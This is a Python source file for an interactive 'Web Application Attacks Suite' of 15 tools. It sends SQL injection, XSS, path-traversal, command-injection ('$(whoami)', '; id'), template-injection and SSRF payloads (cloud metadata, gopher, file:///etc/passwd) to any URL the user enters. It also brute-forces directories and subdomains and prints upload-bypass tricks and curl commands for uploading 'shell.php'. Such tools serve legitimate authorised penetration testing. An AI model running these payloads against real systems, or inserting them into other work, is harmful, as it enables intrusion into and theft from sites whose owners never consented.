#!/usr/bin/env python3
"""
A2Tool v4.0 - Web Application Attacks Module (15 Tools)
Author: Ayush Rajdev & Anzar Iqbal
"""

import os, sys, subprocess, re, json, time, socket, urllib.parse
from datetime import datetime
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
    class Style: RESET_ALL='';BRIGHT='';DIM='';NORMAL=''

R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL

def _run(cmd, shell=True, timeout=30):
    try: return subprocess.check_output(cmd, shell=shell, stderr=subprocess.STDOUT, timeout=timeout).decode('utf-8', errors='ignore')
    except: return ''

def menu():
    while True:
        print(f"\n{G}╔══════════════════════════════════════════════════════════════╗{RS}")
        print(f"{G}║{W}              Web Application Attacks Suite                 {G}║{RS}")
        print(f"{G}╠══════════════════════════════════════════════════════════════╣{RS}")
        print(f"{G}║{W} [01]{R}  SQL Injection Scanner                             {G}║{RS}")
        print(f"{G}║{W} [02]{R}  XSS (Cross-Site Scripting) Scanner                {G}║{RS}")
        print(f"{G}║{W} [03]{R}  LFI/RFI Scanner                                  {G}║{RS}")
        print(f"{G}║{W} [04]{R}  Directory Bruteforce (DirBuster)                  {G}║{RS}")
        print(f"{G}║{W} [05]{R}  Command Injection Check                           {G}║{RS}")
        print(f"{G}║{W} [06]{R}  CSRF Vulnerability Test                           {G}║{RS}")
        print(f"{G}║{W} [07]{R}  CMS Fingerprinting (WP/Joomla/Drupal)             {G}║{RS}")
        print(f"{G}║{W} [08]{R}  Subdomain Enumeration (DNS Brute)                 {G}║{RS}")
        print(f"{G}║{W} [09]{R}  Parameter Fuzzing                                 {G}║{RS}")
        print(f"{G}║{W} [10]{R}  API Security Testing                              {G}║{RS}")
        print(f"{G}║{W} [11]{R}  Session Hijacking Check                           {G}║{RS}")
        print(f"{G}║{W} [12]{R}  File Upload Vulnerability Test                     {G}║{RS}")
        print(f"{G}║{W} [13]{R}  Server-Side Template Injection (SSTI)             {G}║{RS}")
        print(f"{G}║{W} [14]{R}  Server-Side Request Forgery (SSRF)                {G}║{RS}")
        print(f"{G}║{W} [15]{R}  GraphQL Introspection & Testing                   {G}║{RS}")
        print(f"{G}║{W} [0]{R}   Back to Main Menu                                  {G}║{RS}")
        print(f"{G}╚══════════════════════════════════════════════════════════════╝{RS}")
        ch = input(f"\n{Y}  A2Tool[Web] » {RS}").strip()
        if ch == '0': break
        elif ch == '1': sql_injection()
        elif ch == '2': xss_scanner()
        elif ch == '3': lfi_rfi()
        elif ch == '4': dir_bruteforce()
        elif ch == '5': cmd_injection()
        elif ch == '6': csrf_test()
        elif ch == '7': cms_fingerprint()
        elif ch == '8': subdomain_enum()
        elif ch == '9': param_fuzz()
        elif ch == '10': api_test()
        elif ch == '11': session_hijack()
        elif ch == '12': file_upload_test()
        elif ch == '13': ssti_test()
        elif ch == '14': ssrf_test()
        elif ch == '15': graphql_test()
        else: print(f"{R}[!] Invalid option{RS}")

def sql_injection():
    """Tool 1: SQL Injection Scanner"""
    url = input(f"  {W}[?] Target URL (with parameter): {RS}").strip()
    print(f"\n{G}[+] Testing SQL Injection on {url}...{RS}")
    
    # Test payloads
    payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "' UNION SELECT 1--", "'; DROP TABLE--", "' OR 1=1--"]
    try:
        import requests
        for payload in payloads:
            test_url = url + urllib.parse.quote(payload)
            r = requests.get(test_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            if any(err in r.text.lower() for err in ['sql', 'mysql', 'syntax error', 'ora-', 'unclosed quotation']):
                print(f"  {R}[!] Possible SQL Injection: {payload}{RS}")
            else:
                print(f"  {G}[+] Tested: {payload[:30]}... - No obvious injection{RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    print(f"\n{W}Recommended tool: sqlmap -u \"{url}\" --batch{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def xss_scanner():
    """Tool 2: XSS Scanner"""
    url = input(f"  {W}[?] Target URL (with parameter): {RS}").strip()
    param = input(f"  {W}[?] Parameter name to test: {RS}").strip()
    
    print(f"\n{G}[+] Testing XSS on {url}...{RS}")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><svg/onload=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<body onload=alert(1)>",
        "';alert(1);//",
        "\"><img src=x onerror=prompt(1)>",
    ]
    
    try:
        import requests
        for payload in payloads:
            params = {param: payload}
            r = requests.get(url, params=params, timeout=10, 
                           headers={'User-Agent': 'Mozilla/5.0'})
            if payload in r.text:
                print(f"  {R}[!] XSS VULNERABLE: {payload[:40]}{RS}")
            else:
                print(f"  {G}[+] Tested: {payload[:30]}...{RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def lfi_rfi():
    """Tool 3: LFI/RFI Scanner"""
    url = input(f"  {W}[?] Target URL (e.g., http://site.com/page.php?file=): {RS}").strip()
    print(f"\n{G}[+] Testing LFI/RFI on {url}...{RS}")
    
    linux_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ",
        "/proc/version", "/var/log/apache2/access.log", "/var/log/httpd/access_log"
    ]
    windows_files = [
        "C:\\boot.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini", "C:\\Windows\\php.ini"
    ]
    
    payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../windows/win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "....//....//....//....//etc/passwd%00",
    ]
    
    try:
        import requests
        for payload in payloads:
            test_url = url + payload
            r = requests.get(test_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            if "root:" in r.text or "[extensions]" in r.text or "boot loader" in r.text:
                print(f"  {R}[!] LFI FOUND: {payload}{RS}")
                print(f"  Content: {r.text[:200]}...")
                break
            else:
                print(f"  {G}[+] Tested: {payload[:40]}...{RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def dir_bruteforce():
    """Tool 4: Directory Bruteforce"""
    url = input(f"  {W}[?] Target URL (e.g., http://site.com): {RS}").strip()
    wordlist = input(f"  {W}[?] Wordlist path (default: common.txt): {RS}").strip() or 'common.txt'
    
    print(f"\n{G}[+] Directory bruteforce on {url}...{RS}")
    
    # Common directories if wordlist not found
    common_dirs = [
        'admin','login','wp-admin','wp-content','uploads','backup','phpmyadmin',
        'config','css','js','img','images','api','v1','v2','test','dev','staging',
        '.git','.env','.htaccess','robots.txt','sitemap.xml','crossdomain.xml',
        'cgi-bin','includes','modules','plugins','themes','vendor','node_modules',
        'sql','database','db','media','files','download','docs','documentation',
        'chat','forum','blog','shop','store','cart','checkout','payment'
    ]
    
    if os.path.exists(wordlist):
        with open(wordlist, 'r', errors='ignore') as f:
            dirs = [line.strip() for line in f if line.strip()]
    else:
        dirs = common_dirs
        print(f"  {Y}[!] Using built-in wordlist ({len(dirs)} items){RS}")
    
    found = []
    try:
        import requests
        for d in dirs:
            test_url = f"{url.rstrip('/')}/{d}"
            try:
                r = requests.get(test_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    found.append((d, r.status_code, len(r.content)))
                    print(f"  {G}[{r.status_code}]{RS} {Y}{test_url:<60}{RS} {C}{len(r.content)} bytes{RS}")
                elif r.status_code in [301, 302, 403]:
                    print(f"  {Y}[{r.status_code}]{RS} {test_url}")
            except: pass
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    print(f"\n{G}[+] Found {len(found)} directories{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def cmd_injection():
    """Tool 5: Command Injection Check"""
    url = input(f"  {W}[?] Target URL (with parameter): {RS}").strip()
    param = input(f"  {W}[?] Parameter name: {RS}").strip()
    
    print(f"\n{G}[+] Testing Command Injection on {url}...{RS}")
    
    payloads = [
        "; ls",
        "| ls",
        "& dir",
        "&& whoami",
        "` whoami`",
        "$(whoami)",
        "| whoami",
        "; whoami",
        "& whoami &",
        "| id",
        "; id",
    ]
    
    indicators = ['root','admin','user','uid=','www-data','nt authority']
    
    try:
        import requests
        for payload in payloads:
            params = {param: payload}
            r = requests.get(url, params=params, timeout=10,
                           headers={'User-Agent': 'Mozilla/5.0'})
            for ind in indicators:
                if ind.lower() in r.text.lower():
                    print(f"  {R}[!] Command Injection: {payload} → Response contains '{ind}'{RS}")
                    break
            else:
                print(f"  {G}[+] Tested: {payload[:20]}...{RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def csrf_test():
    """Tool 6: CSRF Test"""
    url = input(f"  {W}[?] Target URL (form page): {RS}").strip()
    print(f"\n{G}[+] Testing CSRF protections on {url}...{RS}")
    
    try:
        import requests
        r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        
        # Check for CSRF tokens
        has_csrf_token = bool(re.search(r'csrf|token|_token|authenticity_token', r.text, re.I))
        has_sameorigin = 'SameSite' in r.headers.get('Set-Cookie', '')
        has_referrer = bool(re.search(r'referrer|origin', r.text, re.I))
        
        print(f"\n  {W}CSRF Protection Analysis:{RS}")
        if has_csrf_token:
            print(f"  {G}[✓] CSRF token found in form{RS}")
        else:
            print(f"  {R}[✗] No CSRF token found - POTENTIALLY VULNERABLE{RS}")
        
        if has_sameorigin:
            print(f"  {G}[✓] SameSite cookie attribute set{RS}")
        else:
            print(f"  {Y}[!] SameSite not set on cookies{RS}")
        
        if has_referrer:
            print(f"  {G}[✓] Referrer/Origin header check present{RS}")
        
        print(f"\n  {W}Recommendations:{RS}")
        print(f"  • Use anti-CSRF tokens for all state-changing operations")
        print(f"  • Set SameSite=Strict or SameSite=Lax on cookies")
        print(f"  • Validate Referrer/Origin headers")
        print(f"  • Use custom request headers (X-Requested-With)")
        
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def cms_fingerprint():
    """Tool 7: CMS Fingerprinting"""
    url = input(f"  {W}[?] Target URL: {RS}").strip()
    print(f"\n{G}[+] CMS Fingerprinting {url}...{RS}")
    
    try:
        import requests
        r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        html = r.text.lower()
        
        print(f"\n  {W}CMS Detection:{RS}")
        
        # WordPress
        wp_indicators = ['wp-content', 'wp-includes', 'wp-json', 'wordpress']
        if any(i in html for i in wp_indicators):
            ver = re.search(r'<meta name="generator" content="WordPress ([^"]+)"', r.text, re.I)
            print(f"  {G}[✓]{RS} WordPress {ver.group(1) if ver else 'Unknown version'}")
        
        # Joomla
        joomla_indicators = ['joomla', 'com_content', 'com_users', '/media/jui/']
        if any(i in html for i in joomla_indicators):
            ver = re.search(r'<meta name="generator" content="Joomla! ([^"]+)"', r.text, re.I)
            print(f"  {G}[✓]{RS} Joomla! {ver.group(1) if ver else 'Unknown version'}")
        
        # Drupal
        drupal_indicators = ['drupal', 'sites/default', 'core/themes']
        if any(i in html for i in drupal_indicators):
            print(f"  {G}[✓]{RS} Drupal")
        
        # Magento
        magento_indicators = ['mage.cookies', 'Magento_', 'magestore']
        if any(i in html for i in magento_indicators):
            print(f"  {G}[✓]{RS} Magento")
        
        # Other CMS
        if 'shopify' in html:
            print(f"  {G}[✓]{RS} Shopify")
        if 'wix' in html:
            print(f"  {G}[✓]{RS} Wix")
        if 'squarespace' in html:
            print(f"  {G}[✓]{RS} Squarespace")
        if any(i in html for i in ['wp-content', 'wp-includes']) is False:
            if any(i in html for i in ['joomla', 'drupal', 'magento']) is False:
                print(f"  {Y}[-] Custom/Unknown CMS{RS}")
        
        # Server headers
        print(f"\n  {W}Server Info:{RS}")
        print(f"  {C}Server:{RS} {r.headers.get('Server', 'N/A')}")
        print(f"  {C}X-Powered-By:{RS} {r.headers.get('X-Powered-By', 'N/A')}")
        
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def subdomain_enum():
    """Tool 8: Subdomain Enumeration"""
    domain = input(f"  {W}[?] Domain: {RS}").strip()
    wordlist = input(f"  {W}[?] Wordlist path (default: subdomains.txt): {RS}").strip() or 'subdomains.txt'
    
    print(f"\n{G}[+] Enumerating subdomains for {domain}...{RS}")
    
    common_subs = ['www','mail','admin','api','blog','dev','test','vpn','portal',
                  'secure','app','cdn','static','files','support','help','docs',
                  'webmail','smtp','ftp','ssh','git','jenkins','jira','wiki',
                  'shop','store','billing','payment','gateway','login','register',
                  'm','mobile','remote','office365','owa','autodiscover','ns1',
                  'ns2','mx','mail1','mail2','server','whm','cpanel','beta',
                  'demo','stage','prod','qa','labs','internal','corp','hr']
    
    if os.path.exists(wordlist):
        with open(wordlist, 'r', errors='ignore') as f:
            subs = [line.strip() for line in f if line.strip()]
    else:
        subs = common_subs
        print(f"  {Y}[!] Using built-in wordlist ({len(subs)} items){RS}")
    
    found = []
    for sub in subs:
        subdomain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            found.append((subdomain, ip))
            print(f"  {G}[+]{RS} {C}{subdomain:<30}{RS} {Y}{ip}{RS}")
        except: pass
    
    print(f"\n{G}[+] Found {len(found)} subdomains{RS}")
    if found:
        fname = f"subdomains_{domain}_{datetime.now().strftime('%Y%m%d')}.txt"
        with open(fname, 'w') as f:
            for sub, ip in found:
                f.write(f"{sub},{ip}\n")
        print(f"{G}[+] Saved to {fname}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def param_fuzz():
    """Tool 9: Parameter Fuzzing"""
    url = input(f"  {W}[?] Target URL (e.g., http://site.com/page.php): {RS}").strip()
    print(f"\n{G}[+] Parameter Fuzzing on {url}...{RS}")
    
    params = ['id','user','admin','page','file','name','cmd','exec','command',
              'search','query','debug','test','action','do','func','view',
              'template','include','require','path','doc','document','log',
              'config','setting','option','type','cat','category','dir',
              'download','upload','img','image','host','port','url','redirect']
    
    found_params = []
    try:
        import requests
        for param in params:
            try:
                r = requests.get(f"{url}?{param}=test", timeout=5,
                               headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code != 404:
                    found_params.append(param)
                    print(f"  {G}[+]{RS} {Y}{param} = test{RS} → Status: {r.status_code}")
            except: pass
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    print(f"\n{G}[+] Found {len(found_params)} valid parameters{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def api_test():
    """Tool 10: API Security Testing"""
    url = input(f"  {W}[?] API Base URL (e.g., https://api.site.com/v1): {RS}").strip()
    print(f"\n{G}[+] API Security Testing on {url}...{RS}")
    
    endpoints = ['/users','/admin','/login','/register','/config','/health',
                 '/docs','/swagger','/openapi.json','/graphql','/v1','/v2',
                 '/api','/internal','/debug','/status','/metrics','/info']
    
    print(f"\n  {W}Checking endpoints...{RS}")
    try:
        import requests
        for ep in endpoints:
            try:
                r = requests.get(f"{url.rstrip('/')}{ep}", timeout=5,
                               headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code != 404:
                    print(f"  {G}[{r.status_code}]{RS} {Y}{ep}{RS}")
            except: pass
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    print(f"\n  {W}API Security Checklist:{RS}")
    print(f"  {W}•{RS} Check for authentication bypass")
    print(f"  {W}•{RS} Test rate limiting")
    print(f"  {W}•{RS} Check for excessive data exposure")
    print(f"  {W}•{RS} Test mass assignment")
    print(f"  {W}•{RS} Check for injection vulnerabilities")
    print(f"  {W}•{RS} Verify HTTPS enforcement")
    print(f"  {W}•{RS} Check CORS configuration")
    print(f"  {W}•{RS} Review authentication (JWT/OAuth)")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def session_hijack():
    """Tool 11: Session Hijacking Check"""
    url = input(f"  {W}[?] Target login URL: {RS}").strip()
    print(f"\n{G}[+] Session Security Analysis on {url}...{RS}")
    
    try:
        import requests
        r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
        
        cookies = r.headers.get('Set-Cookie', '')
        
        print(f"\n  {W}Cookie Analysis:{RS}")
        if not cookies:
            print(f"  {R}[✗] No cookies set - sessions may not be tracked{RS}")
            input(f"\n{Y}[+] Press Enter to continue...{RS}")
            return
        
        # Check Secure flag
        if 'Secure' in cookies:
            print(f"  {G}[✓] Secure flag is set (HTTPS only){RS}")
        else:
            print(f"  {R}[✗] Secure flag MISSING - cookie sent over HTTP{RS}")
        
        # Check HttpOnly flag
        if 'HttpOnly' in cookies:
            print(f"  {G}[✓] HttpOnly flag is set (XSS protection){RS}")
        else:
            print(f"  {R}[✗] HttpOnly flag MISSING - accessible via JavaScript{RS}")
        
        # Check SameSite
        if 'SameSite' in cookies:
            ss = re.search(r'SameSite=(\w+)', cookies)
            if ss:
                print(f"  {G}[✓] SameSite={ss.group(1)}{RS}")
        else:
            print(f"  {R}[✗] SameSite attribute MISSING{RS}")
        
        # Session ID entropy
        sid = re.search(r'([A-Za-z0-9%]+)=([^;]+)', cookies)
        if sid:
            print(f"\n  {W}Session ID:{RS} {sid.group(1)}={sid.group(2)[:30]}...")
            print(f"  {W}Length:{RS} {len(sid.group(2))} chars")
            if len(sid.group(2)) < 20:
                print(f"  {R}[!] Session ID too short (<20 chars) - may be predictable{RS}")
    
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def file_upload_test():
    """Tool 12: File Upload Vulnerability Test"""
    url = input(f"  {W}[?] Upload URL: {RS}").strip()
    print(f"\n{G}[+] File Upload Security Analysis{RS}")
    
    print(f"\n  {W}Test Cases:{RS}")
    print(f"  1. Upload PHP file: shell.php")
    print(f"  2. Upload ASP file: cmd.asp")
    print(f"  3. Upload with double extension: shell.php.jpg")
    print(f"  4. Null byte injection: shell.php%00.jpg")
    print(f"  5. Content-type bypass: Change Content-Type to image/jpeg")
    print(f"  6. Upload .htaccess with AddType application/x-httpd-php .jpg")
    print(f"  7. Upload SVG with XSS payload")
    print(f"  8. Upload XML with XXE payload")
    
    print(f"\n  {W}Bypass Techniques:{RS}")
    print(f"  {W}•{RS} Change file extension to .php5, .phtml, .pht, .shtml")
    print(f"  {W}•{RS} Use .php;.jpg or .php.jpg (Apache misconfiguration)")
    print(f"  {W}•{RS} Upload .user.ini or .htaccess for configuration")
    print(f"  {W}•{RS} Use magic byte injection (GIF89a<?php...)")
    
    print(f"\n  {W}curl test commands:{RS}")
    print(f"  curl -F \"file=@shell.php\" {url}")
    print(f"  curl -F \"file=@shell.php;type=image/jpeg\" {url}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def ssti_test():
    """Tool 13: SSTI Test"""
    url = input(f"  {W}[?] Target URL (with parameter): {RS}").strip()
    param = input(f"  {W}[?] Parameter to test: {RS}").strip()
    
    print(f"\n{G}[+] Testing SSTI on {url}...{RS}")
    
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{self}}",
        "${7*7}",
        "{{7*'7'}}",
    ]
    
    try:
        import requests
        for payload in payloads:
            params = {param: payload}
            r = requests.get(url, params=params, timeout=10,
                           headers={'User-Agent': 'Mozilla/5.0'})
            if '49' in r.text or '7777777' in r.text:
                print(f"  {R}[!] SSTI VULNERABLE: {payload}{RS}")
            else:
                print(f"  {G}[+] Tested: {payload[:20]}...{RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def ssrf_test():
    """Tool 14: SSRF Test"""
    url = input(f"  {W}[?] Target URL (with url/redirect parameter): {RS}").strip()
    param = input(f"  {W}[?] Parameter name: {RS}").strip()
    
    print(f"\n{G}[+] Testing SSRF on {url}...{RS}")
    
    test_urls = [
        "http://127.0.0.1:80",
        "http://localhost:22",
        "http://[::1]:80",
        "http://0.0.0.0:443",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "file:///etc/passwd",
        "dict://localhost:11211/",
        "gopher://localhost:6379/",
    ]
    
    try:
        import requests
        for test in test_urls:
            params = {param: test}
            r = requests.get(url, params=params, timeout=10,
                           headers={'User-Agent': 'Mozilla/5.0'})
            if r.status_code != 404 and r.status_code != 500:
                print(f"  {Y}[{r.status_code}]{RS} Tested: {test[:40]}... - Response: {len(r.content)} bytes")
            else:
                print(f"  {G}[+] Tested: {test[:30]}... - Blocked ({r.status_code}){RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def graphql_test():
    """Tool 15: GraphQL Introspection & Testing"""
    url = input(f"  {W}[?] GraphQL endpoint URL: {RS}").strip()
    print(f"\n{G}[+] Testing GraphQL at {url}...{RS}")
    
    # Introspection query
    introspection_query = """
    {
      __schema {
        types {
          name
          fields {
            name
            type {
              name
              kind
            }
          }
        }
      }
    }
    """
    
    print(f"\n  {W}Testing introspection...{RS}")
    try:
        import requests
        r = requests.post(url, json={'query': introspection_query}, timeout=10,
                         headers={'User-Agent': 'Mozilla/5.0'})
        
        if r.status_code == 200 and 'data' in r.json():
            data = r.json().get('data', {})
            schema = data.get('__schema', {})
            types = schema.get('types', [])
            print(f"  {R}[!] Introspection ENABLED! Found {len(types)} types{RS}")
            for t in types[:10]:
                print(f"    {C}Type:{RS} {t.get('name', 'unknown')}")
        else:
            print(f"  {G}[+] Introspection disabled or blocked{RS}")
        
        # Test common mutations
        print(f"\n  {W}Testing common mutations...{RS}")
        mutations = [
            "{ __typename }",
            "mutation { login(username:\"test\",password:\"test\") { token } }",
        ]
        for m in mutations:
            r = requests.post(url, json={'query': m}, timeout=10,
                            headers={'User-Agent': 'Mozilla/5.0'})
            print(f"  {W}Query:{RS} {m[:40]}... → {Y}{r.status_code}{RS}")
            
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    
    print(f"\n  {W}GraphQL Tools:{RS}")
    print(f"  {W}•{RS} GraphiQL: {url}/graphiql or {url}/graphql?query=")
    print(f"  {W}•{RS} InQL Scanner (Burp extension)")
    print(f"  {W}•{RS} graphql-map (https://github.com/dolevf/graphql-map)")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")
